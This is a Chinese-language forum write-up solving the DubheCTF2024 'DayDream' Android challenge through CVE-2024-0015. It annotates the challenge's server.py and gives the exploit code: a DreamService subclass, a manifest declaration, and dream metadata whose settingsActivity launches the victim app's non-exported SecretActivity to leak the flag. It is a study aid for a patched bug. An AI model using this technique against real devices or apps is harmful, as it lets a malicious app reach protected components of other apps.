
![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_6DFRHQHAPSFTD8K.webp)

Then

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_9KBWPKDNJQA2BWF.webp)

- 在diff中可以看到上述注释，补丁做了一件事情，确保被调用的组件和使用`DreamService`的是属于同一个apk

- OK，漏洞就说到这里，接下来我们去到比赛题目

# 赛题处理

## `jadx`打开，一共有三部分

- `MainActivity`，没什么信息

- `FlagReceiver`，提供了一个能够接收flag的广播

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_C2495XNVJPHGS4B.webp)

- `SecretActivity`，提供了一个`readFile`能够获取flag

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_7DAG82D2XUHD6PH.webp)

- 很明显，只要调用了`SecretActivity`，就可以得到flag。再结合上面对于CVE的说明，答案已经呼之欲出了

不过不急，我们再看看`server.py`，这个文件也是在给我们提示怎么做

## server.py解读

> 由于我是环境关了以后复现，题目docker又缺文件，然后我改`server.py`又发现模拟器莫名跑不起来。最后索性找了个android12的模拟器敲命令，唉

```python
print_to_user("Welcome to DubheCTF2024 DayDream! Please proof of work to continue.\n")
# sha256的爆破，忘了哪个比赛放pwntools爆破的github链接来着emmm
if not proof_of_work():
    print_to_user("Please proof of work again, exit...\n")
    exit(-1)

# 输入一个apk url，对于没接触过android的人来说可能不知道这是干什么
# 因为android安全中经常做的事情就是写一个AttackApk去攻击目标apk
# 所以这里需要你写的AttackApk的公网下载链接
print_to_user("Please enter your apk url:")

url = sys.stdin.readline().strip()
EXP_FILE = download_file(url)
# 校验下载的apk
if not check_apk(EXP_FILE):
    print_to_user("Invalid apk file.\n")
    exit(-1)
# 启动模拟器
emulator = setup_emulator()
adb(["wait-for-device"])

wait_for_device_boot_complete()
# 直接给你ban咯，readme.md里有说，不过提了一嘴parcel序列化让我想起了2017的那几个洞
adb(["shell", "su", "root", "pm", "disable", "com.android.settings/.accounts.AddAccountSettings"])
# 安装目标apk
adb_install(APK_FILE)
# 启动目标apk
adb_activity(f"{VICTIM}/.MainActivity", wait=True)
# 使用广播将flag文件写入模拟器环境
with open(FLAG_FILE, "r") as f:
    adb_broadcast(f"com.tsctf.SET_FLAG", f"{VICTIM}/.FlagReceiver", extras={"flag": f.read()})
# 安装攻击apk
adb_install(EXP_FILE)
# 启动攻击apk
adb_activity(f"{ATTACKER}/.MainActivity")
# 攻击
one_click()
print_to_user("One_click finished! The logcat log will be output after 5 seconds.\n")
# 将SecretActivity的日志打印出来，如果SecretActivity被调用了，这里就会输出flag
adb(["shell","logcat -d -s SecretActivity", ">", "/logcat_"+ str(ADB_PORT) + ".txt"])
```

流程还是很正常的，关键就是`one_click`了

```python
def one_click():
    # 打开屏保设置页面
    adb(["shell", "am", "start", "-a", "android.settings.DREAM_SETTINGS"])
    adb(["shell", "sleep", "10"])
    # 向下滑（排除误差哈哈哈）
    adb(["shell", "input", "keyevent", "KEYCODE_DPAD_DOWN"])
    adb(["shell", "sleep", "1"])
    # 回车，这里就是选择屏保样式
    adb(["shell", "input", "keyevent", "KEYCODE_ENTER"])
    adb(["shell", "sleep", "5"])
    # 点击对应的选项，这里就是在选择我们编写的屏保部分
    adb(["shell", "input", "tap", "675", "1415"])
    adb(["shell", "sleep", "5"])
    # 点击那个最最最关键的设置按钮
    adb(["shell", "input", "tap", "1256", "842"])
    adb(["shell", "sleep", "1"])
```

OK，接下来我们要做的事情就是写一个apk，然后调用`SecretActivity`了，具体怎么写可以看上面的`DreamService`官方文档

## EXP

> 需要注意的是题目明确了包名

- `DreamService`

```java
package com.tsctf.daydream;

import android.service.dreams.DreamService;

public class MyService extends DreamService {

    @Override
    public void onAttachedToWindow() {
        super.onAttachedToWindow();

        // Exit dream upon user touch
        setInteractive(false);
        // Hide system UI
        setFullscreen(true);
        // Set the dream layout

    }
}
```

- `androidmanifest.xml`声明service（需要注意的是官方说了高API要申请权限）

```xml
<service
    android:name=".MyService"
    android:label="Test"
    android:enabled="true"
    android:exported="true"
    android:permission="android.permission.BIND_DREAM_SERVICE">
    <intent-filter>
        <action android:name="android.service.dreams.DreamService" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <meta-data
        android:name="android.service.dream"
        android:resource="@xml/test_dream_metadata" />
</service>
```

- 核心的activity调用

```xml
<?xml version="1.0" encoding="utf-8"?>
<dream xmlns:android="a02K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4U0K9r3g2E0j5i4y4Q4x3X3g2S2L8X3c8J5L8$3W2V1i4K6u0W2j5$3!0E0i4K6u0r3j5i4m8C8i4K6u0r3M7X3g2K6i4K6u0r3j5h3&6V1M7X3!0A6k6l9`.`." 
    android:settingsActivity="com.tsctf.victimapp/.SecretActivity"/>
```

## 执行效果

> 用户名联想是历史遗留问题:(

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_UEA4JSNCYJBEKMV.webp)

> 附件是复现视频，logcat里有那么多条是因为尝试了不止一次:(

最后附上源码地址：

> [bd0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6g2L8g2k6X3h3o6q4n7N6X3q4i4y4e0m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6t1@1i4K6u0V1x3o6l9I4y4b7`.`.
](https://bbs.kanxue.com/elink@479K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6g2L8g2k6X3h3o6q4n7N6X3q4i4y4e0m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6t1@1i4K6u0V1x3o6l9I4y4b7`.`.)

好了，可以下机了，如果有什么不对的地方欢迎师傅们来拷打~~~

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

[#漏洞相关](https://bbs.kanxue.com/forum-161-1-123.htm)

上传的附件：

- [`CVE-2024-0015.zip`](javascript:void(0);)
  （5.88MB，39次下载）
